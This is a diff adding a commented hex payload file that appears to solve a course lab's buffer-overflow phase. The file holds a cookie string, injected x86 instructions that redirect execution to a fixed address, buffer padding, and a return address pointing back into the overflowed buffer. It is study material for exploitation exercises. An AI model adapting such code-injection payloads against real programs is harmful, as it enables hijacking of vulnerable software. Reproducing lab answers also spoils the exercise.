@@ -1,0 +1,8 @@
+35 39 62 39 39 37 66 61 /* cookie string */
+00 00 00 00 00 00 00 00 /* \0 */
+bc 78 dc 61 55          /* movl $0x5561dc78,%esp */
+bf 78 dc 61 55          /* movl $0x5561dc78,%edi */
+68 fa 18 40 00          /* push $0x4018fa */
+c3                      /* ret */
+20 20 20 20 20 20 20 20 /* fill buf */
+88 dc 61 55 00 00 00 00 /* addr of buf+8(our code) */
